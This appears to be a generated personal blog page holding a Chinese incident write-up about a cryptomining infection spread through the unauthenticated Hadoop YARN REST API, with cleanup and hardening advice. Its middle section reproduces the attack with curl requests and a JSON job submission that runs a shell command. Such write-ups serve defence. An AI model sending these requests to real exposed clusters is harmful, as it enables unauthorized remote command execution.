@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Mayfly Game">
+    
+    <title>
+        
+            消灭利用Hadoop Yarn未授权漏洞挖矿病毒 |
+        
+        Mayfly Game
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Life is short, live it!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.0"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                Mayfly Game
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">消灭利用Hadoop Yarn未授权漏洞挖矿病毒</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Mayfly Game</span>
+                        
+                            <span class="author-label">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-04-26 22:01:14
+    </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>4 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="消灭利用Hadoop-Yarn未授权漏洞挖矿病毒"><a href="#消灭利用Hadoop-Yarn未授权漏洞挖矿病毒" class="headerlink" title="消灭利用Hadoop Yarn未授权漏洞挖矿病毒"></a>消灭利用Hadoop Yarn未授权漏洞挖矿病毒</h1><p>参考文档：<a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/261076.html" >https://www.freebuf.com/articles/system/261076.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>参考文档：<a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/611/" >https://paper.seebug.org/611/<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>一、背景</strong></p>
+<p>最近一段时间，我们的云服经常收到安全报警。top的时候，发现有几个核的使用率是100%。找到相应的进程，却发现exe指向一个已删除的文件（<strong>ld-linux-x86-64</strong>），查看了crontab没有异常，所以就直接kill了。怀疑密码泄露，于是修改了root密码，修改了ssh端口。</p>
+<p>消停了几天，问题又来了，这次是另外一种挖矿病毒。例行kill后，开始考虑病毒来源，这次发现进程的USER是我们的hadoop里面（使用Docker部署）创建的一个USER。猜测可能是因为docker上root的密码太简单了（123456），攻击者通过Docker注入了病毒，于是修改了hadoop docker上root的密码。</p>
+<p>但是问题没有从根本解决，病毒还是野火烧不尽，春风吹又生。已经基本确定的是，病毒是通过Hadoop注入进来的。查看docker里tmp文件夹，找到了病毒文件。修改了/tmp的权限。但是治标不治本，因为病毒的入口并未定位到，于是我暂时关闭了这个Docker。</p>
+<p>现在终于有点时间来解决这个问题，于是找到了这篇文章：H<strong>adoop Yarn REST API 未授权漏洞利用挖矿分析</strong>（<a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/611/" >https://paper.seebug.org/611/<i class="fas fa-external-link-alt"></i></a>）。才发现攻击者是利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行攻击，在未授权的情况下远程执行代码，进行挖矿。</p>
+<p><strong>二、漏洞说明</strong></p>
+<p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</p>
+<h3 id="三、攻击步骤（利用PostMan复现）："><a href="#三、攻击步骤（利用PostMan复现）：" class="headerlink" title="三、攻击步骤（利用PostMan复现）："></a>三、<strong>攻击步骤（利用PostMan复现）：</strong></h3><p>1.申请新的application</p>
+<p>直接通过curl进行POST请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X POST &#39;http:&#x2F;&#x2F;ip:8088&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br></pre></td></tr></table></figure>
+<p>返回内容类似于（注意第一行的application-id)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;application-id&quot;: &quot;application_1637028888425_0001&quot;,</span><br><span class="line">    &quot;maximum-resource-capability&quot;: &#123;</span><br><span class="line">        &quot;memory&quot;: 8192,</span><br><span class="line">        &quot;vCores&quot;: 4,</span><br><span class="line">        &quot;resourceInformations&quot;: &#123;</span><br><span class="line">            &quot;resourceInformation&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;maximumAllocation&quot;: 9223372036854775807,</span><br><span class="line">                    &quot;minimumAllocation&quot;: 0,</span><br><span class="line">                    &quot;name&quot;: &quot;memory-mb&quot;,</span><br><span class="line">                    &quot;resourceType&quot;: &quot;COUNTABLE&quot;,</span><br><span class="line">                    &quot;units&quot;: &quot;Mi&quot;,</span><br><span class="line">                    &quot;value&quot;: 8192</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;maximumAllocation&quot;: 9223372036854775807,</span><br><span class="line">                    &quot;minimumAllocation&quot;: 0,</span><br><span class="line">                    &quot;name&quot;: &quot;vcores&quot;,</span><br><span class="line">                    &quot;resourceType&quot;: &quot;COUNTABLE&quot;,</span><br><span class="line">                    &quot;units&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;value&quot;: 4</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2.构造并提交任务</p>
+<p>Postman body（设置为raw→json), 填写内容如下，其中application-id对应上面得到的id，命令内容为尝试在/var/tmp目录下创建<code>11112222_test_111122222</code>文件，内容也为111：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;am-container-spec&quot;:&#123;</span><br><span class="line">        &quot;commands&quot;:&#123;</span><br><span class="line">            &quot;command&quot;:&quot;echo &#39;111&#39; &gt; &#x2F;var&#x2F;tmp&#x2F;11112222_test_11112222&quot;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;application-id&quot;:&quot;application_1637028888425_0001&quot;,</span><br><span class="line">    &quot;application-name&quot;:&quot;test&quot;,</span><br><span class="line">    &quot;application-type&quot;:&quot;YARN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -i -X POST -H &#39;Accept: application&#x2F;json&#39; -H &#39;Content-Type: application&#x2F;json&#39; http:&#x2F;&#x2F;ip:8088&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps --data-binary @1.json</span><br></pre></td></tr></table></figure>
+<p>即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件。</p>
+<h3 id="三、入侵分析（略）"><a href="#三、入侵分析（略）" class="headerlink" title="三、入侵分析（略）"></a><strong>三、入侵分析（略）</strong></h3><p>在本次分析的案例中，受害机器部署有Hadoop YARN，并且存在未授权访问的安全问题，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的。</p>
+<h3 id="四、安全建议"><a href="#四、安全建议" class="headerlink" title="四、安全建议"></a><strong>四、安全建议</strong></h3><h3 id="清理病毒"><a href="#清理病毒" class="headerlink" title="清理病毒"></a><strong>清理病毒</strong></h3><ol>
+<li>使用top查看进程，kill掉异常进程</li>
+<li>检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</li>
+<li>检查crontab任务列表，删除异常任务</li>
+<li>排查YARN日志，确认异常的application，删除处理</li>
+</ol>
+<h3 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a><strong>安全加固</strong></h3><ol>
+<li>通过iptables或者安全组配置访问策略，限制对8088等端口的访问</li>
+<li>如无必要，不要将接口开放在公网，改为本地或者内网调用</li>
+<li>升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问</li>
+</ol>
+<h2 id="五、解决方案："><a href="#五、解决方案：" class="headerlink" title="五、解决方案："></a>五、解决方案：</h2><ol>
+<li>因为我暂时没有时间去研究Kerberos，暂时还用不到Yarn的服务，所以直接把8088端口禁用了。以观后效。</li>
+</ol>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：消灭利用Hadoop Yarn未授权漏洞挖矿病毒</li>
+        <li>Post author：Mayfly Game</li>
+        <li>Create time：2022-04-26 22:01:14</li>
+        <li>
+            Post link：https://www.mayflygame.com/2022/04/26/消灭利用Hadoop-Yarn未授权漏洞挖矿病毒/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/04/26/Jackson%E5%A4%9A%E6%80%81%E5%9C%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Json/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Jackson多态地反序列化Json</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;Comments</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'eTJNtjwLG3WU6vo2R8rdpgBg-gzGzoHsz',
+                    appKey: 'C6u43EDPpMkduG7tNj0YlHVy',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '',
+                    lang: 'en'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'Mayfly Game';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>&nbsp;-&nbsp;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Mayfly Game</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.0</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B6%88%E7%81%AD%E5%88%A9%E7%94%A8Hadoop-Yarn%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92"><span class="nav-number">1.</span> <span class="nav-text">消灭利用Hadoop Yarn未授权漏洞挖矿病毒</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%88%E5%88%A9%E7%94%A8PostMan%E5%A4%8D%E7%8E%B0%EF%BC%89%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">三、攻击步骤（利用PostMan复现）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90%EF%BC%88%E7%95%A5%EF%BC%89"><span class="nav-number">1.0.2.</span> <span class="nav-text">三、入侵分析（略）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.0.3.</span> <span class="nav-text">四、安全建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E7%90%86%E7%97%85%E6%AF%92"><span class="nav-number">1.0.4.</span> <span class="nav-text">清理病毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="nav-number">1.0.5.</span> <span class="nav-text">安全加固</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">五、解决方案：</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.0/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
